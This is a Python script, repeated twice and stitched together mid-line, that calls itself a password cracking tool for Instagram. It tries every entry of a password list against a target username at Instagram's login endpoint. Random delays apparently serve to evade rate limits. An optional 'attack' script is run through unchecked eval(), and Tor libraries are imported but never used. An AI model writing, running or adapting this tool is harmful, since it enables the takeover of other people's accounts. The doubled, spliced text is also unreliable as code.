import argparse
import os
import sys
import time
import random
import requests
from stem import Signal
from stem.control import Controller
from requests.exceptions import RequestException

def get_passwords(password_list_file):
    with open(password_list_file, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    return passwords

def check_password(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }
    data = {
        'username': username,
        'password': password,
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        return response.json()
    except RequestException as e:
        print(f'Error: {e}')
        return None

def crack_password(username, password_list_file, custom_script=None):
    passwords = get_passwords(password_list_file)
    for password in passwords:
        print(f'Trying password: {password}')
        result = check_password(username, password)
        if result and 'authenticated' in result and result['authenticated']:
            print(f'Password found: {password}')
            if custom_script:
                custom_script(username, password)
            return password
        time.sleep(random.uniform(1, 3))
    print('Password not found')
    return None

def main():
    parser = argparse.ArgumentParser(description='Password cracking tool for Instagram in Python')
    parser.add_argument('-u', '--username', required=True, help='Target Instagram username')
    parser.add_argument('-pl', '--password-list', required=True, help='Password list file')
    parser.add_argument('-i', '--info', action='store_true', help='Show cracked password info')
    parser.add_argument('-cs', '--custom-script', help='Custom Python script for attack')
    args = parser.parse_args()

    if args.info:
        cracked_password = crack_password(args.username, args.password_list, None)
        if cracked_password:
            print(f'Cracked password: {cracked_password}')
        else:
            print('Password not found')
    elif args.custom_script:
        with open(args.custom_script, 'r') as f:
            custom_script_code = f.read()
        custom_script = eval(custom_script_code)
        cracked_password = crack_password(args.username, args.password_list, custom_script)
        if cracked_password:
            print(f'Cracked password: {cracked_password}')
        else:
            print('Password not found')
    else:
        crack_password(args.username, args.password_list)

if __name__ == '__main__':
    main()import argparse
import os
import sys
import time
import random
import requests
from stem import Signal
from stem.control import Controller
from requests.exceptions import RequestException

def get_passwords(password_list_file):
    with open(password_list_file, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    return passwords

def check_password(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }
    data = {
        'username': username,
        'password': password,
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        return response.json()
    except RequestException as e:
        print(f'Error: {e}')
        return None

def crack_password(username, password_list_file, custom_script=None):
    passwords = get_passwords(password_list_file)
    for password in passwords:
        print(f'Trying password: {password}')
        result = check_password(username, password)
        if result and 'authenticated' in result and result['authenticated']:
            print(f'Password found: {password}')
            if custom_script:
                custom_script(username, password)
            return password
        time.sleep(random.uniform(1, 3))
    print('Password not found')
    return None

def main():
    parser = argparse.ArgumentParser(description='Password cracking tool for Instagram in Python')
    parser.add_argument('-u', '--username', required=True, help='Target Instagram username')
    parser.add_argument('-pl', '--password-list', required=True, help='Password list file')
    parser.add_argument('-i', '--info', action='store_true', help='Show cracked password info')
    parser.add_argument('-cs', '--custom-script', help='Custom Python script for attack')
    args = parser.parse_args()

    if args.info:
        cracked_password = crack_password(args.username, args.password_list, None)
        if cracked_password:
            print(f'Cracked password: {cracked_password}')
        else:
            print('Password not found')
    elif args.custom_script:
        with open(args.custom_script, 'r') as f:
            custom_script_code = f.read()
        custom_script = eval(custom_script_code)
        cracked_password = crack_password(args.username, args.password_list, custom_script)
        if cracked_password:
            print(f'Cracked password: {cracked_password}')
        else:
            print('Password not found')
    else:
        crack_password(args.username, args.password_list)

if __name__ == '__main__':
    main()
